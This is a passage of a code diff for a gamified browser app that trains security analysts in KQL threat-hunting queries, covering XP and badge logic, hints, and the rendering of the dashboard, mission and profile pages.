+      state.player.bestStreak = Math.max(state.player.bestStreak, state.player.streak);
+      state.player.completedCount += 1;
+      logActivity('mission', challenge.title, finalXp);
+
+      const prevLevel = levelForXp(state.player.xp - finalXp).level;
+      const newLevel = levelForXp(state.player.xp).level;
+      state.levelUpFrom = newLevel > prevLevel ? prevLevel : null;
+
+      const newBadges = [];
+      if (state.player.completedCount === 1) { const b = awardBadge('first_blood'); if (b) newBadges.push(b); }
+      if ((challenge.concepts || []).includes('where')) { const b = awardBadge('filter_rookie'); if (b) newBadges.push(b); }
+      if ((challenge.concepts || []).includes('project')) { const b = awardBadge('data_explorer'); if (b) newBadges.push(b); }
+      if ((challenge.concepts || []).includes('summarize')) { const b = awardBadge('aggregation_apprentice'); if (b) newBadges.push(b); }
+      if ((challenge.concepts || []).some(c => c === 'datetime' || c === 'bin')) { const b = awardBadge('time_traveler'); if (b) newBadges.push(b); }
+      if ((challenge.concepts || []).some(c => ['has', 'contains', 'string operators'].includes(c))) { const b = awardBadge('string_ninja'); if (b) newBadges.push(b); }
+      if ((challenge.concepts || []).some(c => c.startsWith('join'))) { const b = awardBadge('join_master'); if (b) newBadges.push(b); }
+      if ((challenge.concepts || []).includes('union')) { const b = awardBadge('correlation_specialist'); if (b) newBadges.push(b); }
+      if (rec.firstTry) { const b = awardBadge('no_hints_needed'); if (b) newBadges.push(b); }
+      if (state.player.streak === 5) { const b = awardBadge('streak_5'); if (b) newBadges.push(b); }
+      if (state.player.streak === 10) { const b = awardBadge('streak_10'); if (b) newBadges.push(b); }
+      if (challenge.badge) { const b = awardBadge(challenge.badge); if (b) newBadges.push(b); }
+      if (state.player.completedCount === 5) { const b = awardBadge('table_scout'); if (b) newBadges.push(b); }
+      if (challenge.moduleId === 'M13') { const b = awardBadge('threat_hunter_badge'); if (b) newBadges.push(b); }
+      const zeroHintCount = Object.values(state.player.completed).filter(r => r.hintsUsed === 0).length + (rec.hintsUsed === 0 ? 1 : 0);
+      if (zeroHintCount >= 5) { const b = awardBadge('zero_hint_hunter'); if (b) newBadges.push(b); }
+      if (state.player.completedCount === ALL_STEPS.filter(c => !c.campaign).length) { const b = awardBadge('soc_legend'); if (b) newBadges.push(b); }
+      state._newBadges = newBadges;
+    }
+    state.player.completed[state.currentId] = rec;
+    delete state.player.inProgress[state.currentId];
+    if (!challenge.review) maybeQueueReview();
+    if (challenge.review) state.player.reviewPool = state.player.reviewPool.filter(r => r.id !== state.currentId);
+  } else {
+    state.player.streak = 0;
+    if (progress.attempts >= 2) markWeak(challenge.concepts || []);
+    recordConceptResult(challenge.concepts || [], false);
+  }
+  state.player.lastActive = Date.now();
+  savePlayer();
+}
+
+function useHint() {
+  const challenge = getChallengeById(state.currentId);
+  if (state.hintLevel < (challenge.hints || []).length) state.hintLevel++;
+}
+function revealSolution() {
+  state.showSolution = true;
+}
+
+// ============================================================
+// RENDERING
+// ============================================================
+const $app = () => document.getElementById('app');
+const esc = (s) => String(s == null ? '' : s).replace(/[&<>"']/g, c => ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' }[c]));
+const nl2br = (s) => esc(s).replace(/\n/g, '<br>');
+
+function starRow(n) {
+  const total = 6;
+  let out = '';
+  for (let i = 1; i <= Math.min(n, 5); i++) out += '⭐';
+  if (n >= 6) out = '💀 NIGHTMARE';
+  return out;
+}
+
+function renderHud() {
+  const p = state.player;
+  const rank = levelForXp(p.xp);
+  const pct = rank.xpToNext === Infinity ? 100 : Math.round((rank.xpIntoLevel / rank.xpToNext) * 100);
+  return `
+  <div class="hud">
+    <div class="hud-left" data-action="goto-dashboard" role="button" tabindex="0">
+      <svg class="hud-insignia" viewBox="0 0 40 40" xmlns="http://www.w3.org/2000/svg">
+        <polygon points="20,2 36,11 36,29 20,38 4,29 4,11" fill="rgba(43,232,255,.08)" stroke="#2be8ff" stroke-width="2"/>
+        <circle cx="20" cy="20" r="7" fill="none" stroke="#2be8ff" stroke-width="1.5" opacity="0.8"/>
+        <circle cx="20" cy="20" r="2" fill="#ff3fa4"/>
+      </svg>
+      <div class="hud-logo">KQL<span>QUEST</span></div>
+    </div>
+    <div class="hud-mid">
+      <div class="hud-rank">LV.${rank.level} · ${esc(rank.name)}</div>
+      <div class="xpbar"><div class="xpbar-fill" style="width:${pct}%"></div></div>
+      <div class="hud-xp-label">${rank.xpIntoLevel} / ${rank.xpToNext === Infinity ? '∞' : rank.xpToNext} XP</div>
+    </div>
+    <div class="hud-right">
+      <div class="hud-streak" title="Current streak">🔥 ${p.streak}</div>
+      <button class="icon-btn" data-action="goto-casefiles" title="Case Files">🗂️</button>
+      <button class="icon-btn" data-action="goto-skilltree" title="Skill Tree">🌳</button>
+      <button class="icon-btn" data-action="goto-badges" title="Badges">🏅</button>
+      <button class="icon-btn" data-action="goto-profile" title="Profile">🧑‍💻</button>
+      <button class="icon-btn" data-action="toggle-mute" title="Mute">${p.muted ? '🔇' : '🔊'}</button>
+      <button class="icon-btn danger" data-action="open-reset-confirm" title="Reset Progress">🗑️</button>
+    </div>
+  </div>`;
+}
+
+function renderResetConfirmModal() {
+  return `<div class="modal-overlay" data-action="cancel-reset">
+    <div class="modal reset-modal" style="--rc:var(--red)">
+      <div class="reset-modal-icon">⚠️</div>
+      <div class="badge-modal-name">Reset All Progress?</div>
+      <div class="badge-modal-desc">This wipes your XP, level, streak, badges, and every completed mission — permanently. Your analyst callsign will be forgotten and training will restart from Mission 1.</div>
+      <div class="reset-modal-actions">
+        <button class="btn btn-ghost" data-action="cancel-reset">Cancel</button>
+        <button class="btn btn-ghost danger" data-action="confirm-reset">🗑️ Wipe & Restart</button>
+      </div>
+    </div>
+  </div>`;
+}
+
+function renderOnboarding() {
+  return `
+  <div class="onboard">
+    <div class="onboard-card">
+      <svg class="hero-emblem" viewBox="0 0 200 200" xmlns="http://www.w3.org/2000/svg">
+        <defs>
+          <radialGradient id="heroGlow" cx="50%" cy="45%" r="60%">
+            <stop offset="0%" stop-color="#2be8ff" stop-opacity="0.32"/>
+            <stop offset="100%" stop-color="#2be8ff" stop-opacity="0"/>
+          </radialGradient>
+          <linearGradient id="heroStroke" x1="0" y1="0" x2="1" y2="1">
+            <stop offset="0%" stop-color="#2be8ff"/>
+            <stop offset="100%" stop-color="#ff3fa4"/>
+          </linearGradient>
+        </defs>
+        <circle cx="100" cy="100" r="95" fill="url(#heroGlow)"/>
+        <polygon points="100,8 176,50 176,150 100,192 24,150 24,50" fill="rgba(13,22,32,0.6)" stroke="url(#heroStroke)" stroke-width="2.5"/>
+        <polygon points="100,28 158,61 158,139 100,172 42,139 42,61" fill="none" stroke="#1c2e3d" stroke-width="1"/>
+        <path d="M24,50 L4,50 M24,150 L4,150 M176,50 L196,50 M176,150 L196,150 M100,8 L100,-6 M100,192 L100,206" stroke="#2be8ff" stroke-width="2" stroke-linecap="round" opacity="0.55"/>
+        <circle cx="4" cy="50" r="3.5" fill="#2be8ff"/>
+        <circle cx="4" cy="150" r="3.5" fill="#ff3fa4"/>
+        <circle cx="196" cy="50" r="3.5" fill="#ff3fa4"/>
+        <circle cx="196" cy="150" r="3.5" fill="#2be8ff"/>
+        <circle cx="100" cy="100" r="40" fill="none" stroke="#2be8ff" stroke-width="1.5" opacity="0.65"/>
+        <circle cx="100" cy="100" r="24" fill="none" stroke="#2be8ff" stroke-width="1.5" opacity="0.45"/>
+        <line x1="100" y1="52" x2="100" y2="148" stroke="#2be8ff" stroke-width="1" opacity="0.35"/>
+        <line x1="52" y1="100" x2="148" y2="100" stroke="#2be8ff" stroke-width="1" opacity="0.35"/>
+        <circle cx="100" cy="100" r="7" fill="#ff3fa4"/>
+      </svg>
+      <div class="glitch-title">KQL<span>QUEST</span></div>
+      <div class="tagline">Hunt. Query. Investigate. Level Up.</div>
+      <p class="onboard-copy">WELCOME, ANALYST.<br><br>
+      The Nightwave Dynamics SOC needs you. Your KQL training begins now.<br><br>
+      You'll learn how to investigate real-world security incidents using Kusto Query Language —
+      the same query language behind Microsoft Sentinel and Microsoft Defender.<br><br>
+      Complete missions. Earn XP. Unlock badges. Master the skill tree.<br>
+      Become a threat hunter.</p>
+      <label class="onboard-label">ENTER YOUR ANALYST CALLSIGN</label>
+      <input id="callsign-input" class="onboard-input" maxlength="20" placeholder="e.g. NIGHTOWL" value="${esc(state.player.name)}" />
+      <button class="btn btn-primary btn-big" data-action="begin-training">▶ BEGIN TRAINING</button>
+    </div>
+  </div>`;
+}
+
+function missionStatusIcon(c) {
+  if (isCompleted(c.id)) return '✅';
+  if (c.id === nextMissionId()) return '▶';
+  if (!isUnlocked(c.id)) return '🔒';
+  return '○';
+}
+
+// ---------------- original decorative artwork (no copyrighted characters — flat silhouette "operative lineup") ----------------
+function heroLineupSvg() {
+  const colors = ['#2be8ff', '#ff3fa4', '#39ff88', '#ffb020', '#b76bff', '#2be8ff', '#ff3fa4'];
+  const poses = [
+    { arm: -20, leg: 4, scale: 0.86 },
+    { arm: 10, leg: -6, scale: 0.94 },
+    { arm: -35, leg: 8, scale: 1 },
+    { arm: 0, leg: 0, scale: 1.12 }, // center hero
+    { arm: 30, leg: -8, scale: 1 },
+    { arm: -10, leg: 6, scale: 0.94 },
+    { arm: 20, leg: -4, scale: 0.86 },
+  ];
+  const figures = poses.map((p, i) => {
+    const x = 90 + i * 145;
+    const c = colors[i];
+    const isHero = i === 3;
+    return `<g transform="translate(${x},210) scale(${p.scale})" opacity="${isHero ? 0.9 : 0.55}">
+      ${isHero ? `
+        <!-- owl mascot: KQL Quest's night-owl analyst -->
+        <ellipse cx="0" cy="-6" rx="34" ry="30" fill="none" stroke="${c}" stroke-width="2.5"/>
+        <path d="M-30,-30 L-40,-58 L-14,-40 Z" fill="none" stroke="${c}" stroke-width="2.5"/>
+        <path d="M30,-30 L40,-58 L14,-40 Z" fill="none" stroke="${c}" stroke-width="2.5"/>
+        <circle cx="-13" cy="-10" r="9" fill="none" stroke="${c}" stroke-width="2"/>
+        <circle cx="13" cy="-10" r="9" fill="none" stroke="${c}" stroke-width="2"/>
+        <circle cx="-13" cy="-10" r="3" fill="${c}"/>
+        <circle cx="13" cy="-10" r="3" fill="${c}"/>
+        <path d="M0,-2 L-5,6 L5,6 Z" fill="${c}"/>
+        <path d="M-34,20 Q-40,50 -20,64 L-14,40 Z" fill="none" stroke="${c}" stroke-width="2"/>
+        <path d="M34,20 Q40,50 20,64 L14,40 Z" fill="none" stroke="${c}" stroke-width="2"/>
+        <path d="M-14,40 L-10,80 L10,80 L14,40 Z" fill="none" stroke="${c}" stroke-width="2"/>
+      ` : `
+        <!-- generic operative silhouette -->
+        <circle cx="0" cy="-70" r="13" fill="none" stroke="${c}" stroke-width="2.5"/>
+        <path d="M-15,-56 L15,-56 L18,8 L-18,8 Z" fill="none" stroke="${c}" stroke-width="2.5"/>
+        <path d="M-16,8 L-22,58 L-9,58 L-5,12 Z" fill="none" stroke="${c}" stroke-width="2"/>
+        <path d="M16,8 L22,58 L9,58 L5,12 Z" fill="none" stroke="${c}" stroke-width="2"/>
+        <g transform="rotate(${p.arm} -14 -48)"><path d="M-14,-48 L-42,-30 L-36,-20 L-10,-36 Z" fill="none" stroke="${c}" stroke-width="2"/></g>
+        <g transform="rotate(${-p.arm} 14 -48)"><path d="M14,-48 L42,-30 L36,-20 L10,-36 Z" fill="none" stroke="${c}" stroke-width="2"/></g>
+      `}
+    </g>`;
+  }).join('');
+  return `<svg class="hero-lineup-svg" viewBox="0 0 1090 260" xmlns="http://www.w3.org/2000/svg" preserveAspectRatio="xMidYMax slice">
+    <ellipse cx="545" cy="235" rx="520" ry="30" fill="url(#lineupGlow)"/>
+    <defs><radialGradient id="lineupGlow" cx="50%" cy="50%" r="50%"><stop offset="0%" stop-color="#2be8ff" stop-opacity="0.25"/><stop offset="100%" stop-color="#2be8ff" stop-opacity="0"/></radialGradient></defs>
+    ${figures}
+  </svg>`;
+}
+
+function renderDashboard() {
+  const p = state.player;
+  const levelNames = { 1: 'KQL RECRUIT', 2: 'DATA TRACKER', 3: 'HUNTER', 4: 'INVESTIGATOR', 5: 'THREAT HUNTER', 6: 'SOC OPERATOR', 7: 'OPERATION NIGHTFALL' };
+  const levelColor = { 1: '#39ff88', 2: '#3ec6ff', 3: '#b76bff', 4: '#ffb020', 5: '#ff5b5b', 6: '#8ea3b0', 7: '#ff2ec4' };
+  const levelIcon = { 1: '🟢', 2: '🔵', 3: '🟣', 4: '🟠', 5: '🔴', 6: '⚫', 7: '☠️' };
+  const nextId = nextMissionId();
+  const nextChallenge = nextId ? getChallengeById(nextId) : null;
+
+  const modulesByLevel = {};
+  ALL_MODULES.forEach(m => { (modulesByLevel[m.level] = modulesByLevel[m.level] || []).push(m); });
+
+  let reviewCard = '';
+  if (p.reviewPool.length) {
+    const r = p.reviewPool[0];
+    reviewCard = `
+    <div class="review-banner" data-action="start-mission" data-id="${r.id}">
+      🧠 <b>KNOWLEDGE CHECK QUEUED</b> — before you continue, let's revisit <b>${esc(r.concepts[0])}</b>. <span class="link">Start Review →</span>
+    </div>`;
+  }
+
+  const dailySeed = new Date().toISOString().slice(0, 10);
+  const dailyDone = !!p.dailyDone[dailySeed];
+  const dailyCard = `
+    <div class="daily-card ${dailyDone ? 'done' : ''}">
+      <div class="daily-head">🎯 DAILY MISSION ${dailyDone ? '· COMPLETE' : ''}</div>
+      <div class="daily-body">Identify every device that connected to <code>cdn-analytics-update.net</code> today. (+150 bonus XP, one-time)</div>
+      ${dailyDone ? '' : `<button class="btn btn-ghost" data-action="do-daily">Accept Mission</button>`}
+    </div>`;
+
+  const continueBar = nextChallenge ? `
+    <div class="continue-bar" data-action="start-mission" data-id="${nextChallenge.id}">
+      <div class="continue-glow"></div>
+      <div class="continue-info">
+        <div class="continue-label">${nextChallenge.review ? '🧠 REVIEW MISSION' : 'CONTINUE CAMPAIGN'}</div>
+        <div class="continue-title">${esc(nextChallenge.moduleTitle)}${nextChallenge.totalSteps > 1 ? ` · Step ${nextChallenge.stepIndex + 1}/${nextChallenge.totalSteps}` : ''}</div>
+      </div>
+      <button class="btn btn-primary">▶ CONTINUE</button>
+    </div>` : `
+    <div class="continue-bar done-bar"><div class="continue-info"><div class="continue-title">🏆 Campaign complete — you've mastered every mission. Revisit any module below anytime.</div></div></div>`;
+
+  const solvedCases = CASE_FILES.filter(c => caseProgress(c.id).solved).length;
+  const casefileBanner = `
+    <div class="casefile-banner" data-action="goto-casefiles">
+      <div class="casefile-banner-icon">🗂️</div>
+      <div class="continue-info">
+        <div class="continue-label">CASE FILE ARCHIVE</div>
+        <div class="continue-title">Real-world incidents · 5W1H investigation reports · ${solvedCases}/${CASE_FILES.length} closed</div>
+      </div>
+      <button class="btn btn-ghost">Open Archive →</button>
+    </div>`;
+
+  let html = `<div class="dashboard">
+    <div class="dashboard-hero">
+      ${heroLineupSvg()}
+      <div class="dashboard-hero-overlay">
+        <div class="dashboard-hero-tag">NIGHTWAVE DYNAMICS SOC</div>
+        <div class="dashboard-hero-title">HUNT. QUERY. INVESTIGATE.</div>
+      </div>
+    </div>
+    <div class="dashboard-header">
+      <div>
+        <div class="dashboard-title">MISSION CONTROL</div>
+        <div class="dashboard-sub">Analyst ${esc(p.name || 'UNKNOWN')} · ${p.completedCount} step${p.completedCount === 1 ? '' : 's'} completed</div>
+      </div>
+    </div>
+    ${continueBar}
+    ${casefileBanner}
+    ${reviewCard}
+    ${dailyCard}
+    <div class="levels">`;
+
+  Object.keys(modulesByLevel).sort((a, b) => a - b).forEach(lv => {
+    const mods = modulesByLevel[lv];
+    const totalSteps = mods.reduce((a, m) => a + m.steps.length, 0);
+    const doneSteps = mods.reduce((a, m) => a + moduleProgress(m.id).done, 0);
+    html += `
+    <div class="level-block" style="--lvcolor:${levelColor[lv]}">
+      <div class="level-block-head">
+        <span class="level-chip">${levelIcon[lv]} LEVEL ${lv}</span>
+        <span class="level-name">${levelNames[lv]}</span>
+        <span class="level-progress">${doneSteps}/${totalSteps}</span>
+      </div>
+      <div class="path-track">`;
+    mods.forEach((m, i) => {
+      const prog = moduleProgress(m.id);
+      const done = prog.done === prog.total;
+      const firstStepId = m.steps.length ? `${m.id}_S1` : null;
+      const unlocked = firstStepId ? isUnlocked(firstStepId) : false;
+      const isCurrent = m.id === (nextChallenge && nextChallenge.moduleId);
+      const align = i % 2 === 0 ? 'align-left' : 'align-right';
+      const totalXp = m.steps.reduce((a, s) => a + s.xp, 0);
+      const icon = done ? '✅' : !unlocked ? '🔒' : m.campaign ? '☠️' : m.boss ? '👾' : '🎯';
+      html += `
+      <div class="path-node-row ${align}">
+        <div class="path-node ${done ? 'done' : ''} ${!unlocked ? 'locked' : ''} ${isCurrent ? 'current' : ''} ${m.boss ? 'boss' : ''}"
+             ${unlocked ? `data-action="start-module" data-id="${m.id}"` : ''}>
+          <div class="path-node-ring hex-frame"><span class="path-node-icon">${icon}</span></div>
+          <div class="path-node-body">
+            <div class="path-node-code">${esc(m.codename || '')}</div>
+            <div class="path-node-title">${esc(m.title)}</div>
+            <div class="path-node-meta"><span>${prog.done}/${prog.total} steps</span><span class="path-node-xp">+${totalXp} XP</span></div>
+          </div>
+        </div>
+      </div>`;
+    });
+    html += `</div></div>`;
+  });
+
+  html += `</div></div>`;
+  return html;
+}
+
+
+function renderMission() {
+  const c = getChallengeById(state.currentId);
+  if (!c) return renderDashboard();
+  const hints = c.hints || [];
+  const canReveal = state.hintLevel >= hints.length;
+  const history = state.queryHistory[c.id] || [];
+  const result = state.attemptResult;
+  const isSolved = isCompleted(c.id);
+
+  let feedbackHtml = '';
+  if (state.lastRunError) {
+    feedbackHtml = `
+    <div class="feedback fail">
+      <div class="feedback-head">⚠️ QUERY FAILED TO RUN</div>
+      <div class="feedback-body">Your query has a syntax or logic error the engine could not evaluate:</div>
+      <pre class="err-msg">${esc(state.lastRunError)}</pre>
+      <div class="feedback-tip">Check operator spelling, matching parentheses/quotes, and that every stage after the first starts with a recognized operator.</div>
+    </div>`;
+  } else if (result) {
+    if (result.status === 'success') {
+      const rec = state.player.completed[c.id];
+      const xpGain = rec ? rec.xpEarned : c.xp;
+      feedbackHtml = `
+      <div class="feedback success">
+        <div class="feedback-head">🎉 MISSION COMPLETE! <span class="float-xp">+${xpGain} XP</span></div>
+        <div class="feedback-body">Excellent work, Analyst. Your query correctly answers the investigation question.</div>
+      </div>`;
+    } else if (result.status === 'empty') {
+      feedbackHtml = `
+      <div class="feedback warn">
+        <div class="feedback-head">🕳️ EMPTY RESULT</div>
+        <div class="feedback-body">Your query ran successfully but returned <b>zero rows</b>, and we expected to find something. Your filter logic is likely too strict, or checking the wrong field/value.</div>
+      </div>`;
+    } else if (result.status === 'partial_over') {
+      feedbackHtml = `
+      <div class="feedback warn">
+        <div class="feedback-head">🟡 PARTIALLY CORRECT — TOO BROAD</div>
+        <div class="feedback-body">You found every record you needed to (${result.matched}/${result.expected}) — but also ${result.got - result.matched} extra ones that shouldn't be there. You're probably missing an additional filter condition (a time window, a threshold, or a second <code>where</code>).</div>
+      </div>`;
+    } else if (result.status === 'partial_under') {
+      feedbackHtml = `
+      <div class="feedback warn">
+        <div class="feedback-head">🟡 PARTIALLY CORRECT — TOO NARROW</div>
+        <div class="feedback-body">You correctly identified ${result.matched} of ${result.expected} matching records, but missed the rest. Your filter is likely more restrictive than the question actually asks for.</div>
+      </div>`;
+    } else {
+      feedbackHtml = `
+      <div class="feedback fail">
+        <div class="feedback-head">❌ QUERY DID NOT SOLVE THE MISSION</div>
+        <div class="feedback-body">Your query ran without error and returned ${result.got} row(s), but it doesn't answer the investigation question — ${result.matched}/${result.expected} expected records were found. Re-read the objective and think through: what table, what field, what condition?</div>
+      </div>`;
+    }
+  }
+
+  let hintsHtml = '';
+  if (hints.length) {
+    hintsHtml = `<div class="hints-panel">
+      <div class="hints-head">💡 HINTS (${state.hintLevel}/${hints.length} used)</div>
+      ${hints.slice(0, state.hintLevel).map((h, i) => `<div class="hint-line"><b>Hint ${i + 1}:</b> ${esc(h)}</div>`).join('')}
+      <div class="hints-actions">
+        ${state.hintLevel < hints.length ? `<button class="btn btn-ghost" data-action="get-hint">Get Hint (${state.hintLevel + 1}/${hints.length})</button>` : ''}
+        ${canReveal && !state.showSolution ? `<button class="btn btn-ghost danger" data-action="reveal-solution">🔓 Reveal Solution</button>` : ''}
+      </div>
+      ${state.showSolution ? `<div class="solution-box"><b>SOLUTION:</b><pre>${esc(c.solutionQuery)}</pre></div>` : ''}
+    </div>`;
+  }
+
+  let explainHtml = '';
+  if (isSolved || state.showSolution) {
+    const steps = explainQuery(c.solutionQuery);
+    explainHtml = `<div class="explain-panel">
+      <div class="explain-head">🧠 EXPLAIN THIS QUERY</div>
+      ${steps.map((s, i) => `<div class="explain-line"><span class="explain-idx">${i + 1}</span><code>${esc(s.stage)}</code><div class="explain-desc">${esc(s.desc)}</div></div>`).join('')}
+      ${c.explainNote ? `<div class="explain-note">📎 ${esc(c.explainNote)}</div>` : ''}
+    </div>`;
+  }
+
+  let resultsHtml = '';
+  if (state.lastRunRows) {
+    resultsHtml = renderResultsTable(state.lastRunRows);
+  }
+
+  const datasets = (c.dataset || '').split('+').map(s => s.trim());
+  const colsHtml = datasets.map(d => `<div class="ds-chip">${esc(d)}<div class="ds-cols">${(TABLE_COLUMNS[d] || []).join(', ')}</div></div>`).join('');
+
+  const newBadgeModal = state._newBadges && state._newBadges.length ? renderBadgeModal(state._newBadges) : '';
+  const levelUpModal = state.levelUpFrom ? renderLevelUpModal() : '';
+
+  // step tracker: dots for every step in this module, so the player can see the whole arc
+  let stepTrackerHtml = '';
+  if (c.totalSteps > 1) {
+    const steps = stepsOfModule(c.moduleId);
+    stepTrackerHtml = `<div class="step-tracker">
+      ${steps.map((s, i) => {
+        const st = isCompleted(s.id) ? 'done' : s.id === c.id ? 'current' : (i < c.stepIndex ? 'done' : 'upcoming');
+        return `<div class="step-dot ${st}" title="Step ${i + 1}">${st === 'done' ? '✓' : i + 1}</div>${i < steps.length - 1 ? '<div class="step-line"></div>' : ''}`;
+      }).join('')}
+    </div>`;
+  }
+  const showFullIntro = c.stepIndex === 0 || c.review;
+  const introBlock = showFullIntro
+    ? `<div class="briefing-story">${nl2br(c.moduleIntro || '')}</div>`
+    : `<div class="briefing-recap">📂 ${esc(c.moduleTitle)} — continuing where you left off. <span class="recap-hint">🔧 Extend the query below.</span></div>`;
+
+  return `
+  <div class="mission-view ${c.boss ? 'boss-bg' : ''}">
+    <div class="mission-briefing">
+      <div class="briefing-top">
+        <button class="btn btn-ghost small" data-action="goto-dashboard">← Mission Control</button>
+        <span class="mission-tag">${c.boss ? '👾 BOSS BATTLE' : (c.review ? '🧠 REVIEW MISSION' : `LEVEL ${c.level}`)}</span>
+      </div>
+      <div class="briefing-code">${esc(c.moduleCodename || '')}</div>
+      <h2 class="briefing-title">${esc(c.moduleTitle)}</h2>
+      ${stepTrackerHtml}
+      <div class="briefing-meta">
+        <span>${starRow(c.difficulty || 2)}</span>
+        <span>+${c.xp} XP</span>
+        ${isSolved ? '<span class="tag-done">✅ SOLVED</span>' : ''}
+      </div>
+      ${introBlock}
+      <div class="briefing-objective"><b>🎯 ${c.totalSteps > 1 ? `STEP ${c.stepIndex + 1}:` : 'OBJECTIVE:'}</b> ${esc(c.objective)}</div>
+      ${c.thinkThrough && c.thinkThrough.length ? `<div class="think-through"><b>Think it through:</b><ul>${c.thinkThrough.map(t => `<li>${esc(t)}</li>`).join('')}</ul></div>` : ''}
+      <div class="ds-chips">${colsHtml}</div>
+      ${hintsHtml}
+      ${explainHtml}
+    </div>
+    <div class="mission-workbench">
+      <div class="editor-toolbar">
+        <button class="btn btn-primary" data-action="run-query">▶ RUN QUERY</button>
+        <button class="btn btn-ghost" data-action="format-query">🧹 Format</button>
+        <button class="btn btn-ghost" data-action="reset-query">🔄 Reset</button>
+        <button class="btn btn-ghost" data-action="copy-query">📋 Copy</button>
+        ${isSolved ? `<button class="btn btn-secondary" data-action="next-mission">Continue →</button>` : ''}
+        ${history.length ? `<select class="history-select" data-action="load-history"><option value="">History (${history.length})</option>${history.map((q, i) => `<option value="${i}">${esc(q.slice(0, 40))}</option>`).join('')}</select>` : ''}
+      </div>
+      <div class="chip-row">${quickInsertChips(datasets)}</div>
+      <div class="editor-wrap">
+        <div class="editor-gutter" id="editor-gutter">1</div>
+        <textarea id="kql-editor" class="editor-input" spellcheck="false" autocapitalize="off" autocomplete="off"
+          placeholder="Write your KQL query here...">${esc(state._draftQuery || '')}</textarea>
+      </div>
+      <div class="results-area">${feedbackHtml}${resultsHtml}</div>
+    </div>
+  </div>
+  ${newBadgeModal}${levelUpModal}`;
+}
+
+function quickInsertChips(datasets) {
+  const ops = ['where', 'project', 'extend', 'summarize ... by', 'count()', 'countif()', 'dcount()', 'distinct', 'sort by ... desc', 'take 10', 'ago(24h)', 'contains', 'has', 'join kind=inner () on'];
+  let cols = [];
+  datasets.forEach(d => { cols = cols.concat(TABLE_COLUMNS[d] || []); });
+  const items = [...ops.map(o => ({ t: o, k: 'op' })), ...cols.map(c => ({ t: c, k: 'col' }))];
+  return items.map(i => `<button class="chip chip-${i.k}" data-action="insert-chip" data-val="${esc(i.t)}">${esc(i.t)}</button>`).join('');
+}
+
+function renderResultsTable(rows) {
+  if (!rows || rows.length === 0) {
+    return `<div class="results-table-wrap"><div class="results-empty">Query executed. 0 rows returned.</div></div>`;
+  }
+  const cols = Object.keys(rows[0]).filter(k => k !== '__rid');
+  const shown = rows.slice(0, 50);
+  return `<div class="results-table-wrap">
+    <div class="results-count">${rows.length} row${rows.length === 1 ? '' : 's'} returned${rows.length > 50 ? ' (showing first 50)' : ''}</div>
+    <div class="table-scroll"><table class="results-table"><thead><tr>${cols.map(c => `<th>${esc(c)}</th>`).join('')}</tr></thead>
+    <tbody>${shown.map(r => `<tr>${cols.map(c => `<td>${esc(formatCell(r[c]))}</td>`).join('')}</tr>`).join('')}</tbody></table></div>
+  </div>`;
+}
+function formatCell(v) {
+  if (v instanceof Date) return v.toISOString().replace('T', ' ').slice(0, 19);
+  if (typeof v === 'boolean') return v ? 'true' : 'false';
+  if (v && typeof v === 'object') return JSON.stringify(v);
+  return v;
+}
+
+function renderBadgeModal(badges) {
+  const b = badges[0];
+  return `<div class="modal-overlay" data-action="dismiss-badge">
+    <div class="modal badge-modal" style="--rc:${RARITY_COLOR[b.rarity]}">
+      <div class="badge-modal-rarity">${b.rarity.toUpperCase()} BADGE UNLOCKED</div>
+      <div class="badge-modal-icon">${b.icon}</div>
+      <div class="badge-modal-name">${esc(b.name)}</div>
+      <div class="badge-modal-desc">${esc(b.desc)}</div>
+      <button class="btn btn-primary" data-action="dismiss-badge">Nice.</button>
+    </div>
+  </div>`;
+}
+function renderLevelUpModal() {
+  const rank = levelForXp(state.player.xp);
+  return `<div class="modal-overlay" data-action="dismiss-levelup">
+    <div class="modal levelup-modal">
+      <div class="levelup-burst">⬆️ LEVEL UP</div>
+      <div class="levelup-rank">LEVEL ${rank.level} — ${esc(rank.name)}</div>
+      <button class="btn btn-primary" data-action="dismiss-levelup">Keep Going</button>
+    </div>
+  </div>`;
+}
+
+function renderProfile() {
+  const p = state.player;
+  const rank = levelForXp(p.xp);
+  const completedList = Object.keys(p.completed);
+  const totalAttempts = Object.values(p.completed).reduce((a, r) => a + r.attempts, 0) + Object.values(p.inProgress || {}).reduce((a, r) => a + r.attempts, 0);
+  const firstTryCount = Object.values(p.completed).filter(r => r.firstTry).length;
+  const firstTryRate = completedList.length ? Math.round((firstTryCount / completedList.length) * 100) : 0;
+  const hintsUsedTotal = Object.values(p.completed).reduce((a, r) => a + r.hintsUsed, 0);
+
+  const scored = Object.entries(p.skillScores).map(([c, s]) => ({ c, pct: Math.round((s.correct / s.total) * 100), total: s.total })).filter(x => x.total >= 1);
+  scored.sort((a, b) => b.pct - a.pct);
+  const strongest = scored.slice(0, 3);
+  const weakest = [...scored].sort((a, b) => a.pct - b.pct).slice(0, 3);
+
+  return `<div class="profile">
+    <button class="btn btn-ghost small" data-action="goto-dashboard">← Mission Control</button>
+    <div class="profile-card">
+      <div class="profile-avatar">🧑‍💻</div>
+      <div>
+        <div class="profile-name">${esc(p.name || 'UNKNOWN')}</div>
+        <div class="profile-rank">LEVEL ${rank.level} — ${esc(rank.name)}</div>
+      </div>
+    </div>
+    <div class="stat-grid">
+      <div class="stat-box"><div class="stat-num">${p.xp}</div><div class="stat-label">Total XP</div></div>
+      <div class="stat-box"><div class="stat-num">🔥 ${p.streak}</div><div class="stat-label">Current Streak</div></div>
+      <div class="stat-box"><div class="stat-num">${p.bestStreak}</div><div class="stat-label">Best Streak</div></div>
+      <div class="stat-box"><div class="stat-num">${completedList.length}</div><div class="stat-label">Missions Completed</div></div>
+      <div class="stat-box"><div class="stat-num">${firstTryRate}%</div><div class="stat-label">First-Attempt Rate</div></div>
+      <div class="stat-box"><div class="stat-num">${hintsUsedTotal}</div><div class="stat-label">Hints Used</div></div>
+      <div class="stat-box"><div class="stat-num">${totalAttempts}</div><div class="stat-label">Total Attempts</div></div>
+      <div class="stat-box"><div class="stat-num">${p.badges.length}</div><div class="stat-label">Badges Earned</div></div>
+    </div>
+    <div class="skill-cols">
+      <div class="skill-col">
+        <div class="skill-col-head">⭐ Strongest Skills</div>
+        ${strongest.length ? strongest.map(s => `<div class="skill-row"><span>${esc(s.c)}</span><div class="skill-bar"><div class="skill-bar-fill good" style="width:${s.pct}%"></div></div><span>${s.pct}%</span></div>`).join('') : '<div class="skill-empty">Complete a few missions to see this.</div>'}
+      </div>
+      <div class="skill-col">
+        <div class="skill-col-head">⚠️ Needs Practice</div>
